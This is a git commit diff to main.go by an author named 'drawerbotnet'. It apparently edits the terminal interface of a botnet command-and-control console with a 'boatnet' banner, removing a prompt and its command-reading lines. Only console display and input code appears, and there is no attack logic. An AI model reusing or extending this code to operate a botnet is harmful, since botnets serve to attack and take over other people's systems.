e462e131822299312719c1049100a7b2d5259eba
drawerbotnet <139976830+drawerbotnet@users.noreply.github.com>
2023-08-15 18:04:26 +0300

    Update main.go

--- main.go
+++ main.go
@@ -1,11 +1,4 @@
-this.conn.Write([]byte("\x1b[1;37;47m \x1b[1;37melisey \x1b[1;31m● boatnet \033[0m\x1b[1;37m ➤➤ "))
-        cmd, err := this.ReadLine(false)
-        if err != nil || cmd == "exit" || cmd == "quit" {
-            return
-        }
-        if cmd == "" {
-            continue
-        }
+
         if err != nil || cmd == "cls" || cmd == "clear" || cmd == "c" {
     this.conn.Write([]byte("\033[2J\033[1;1H"))
     this.conn.Write([]byte("\r\x1b[1;37m             \x1b[1;31m       .::.   \r\n"))
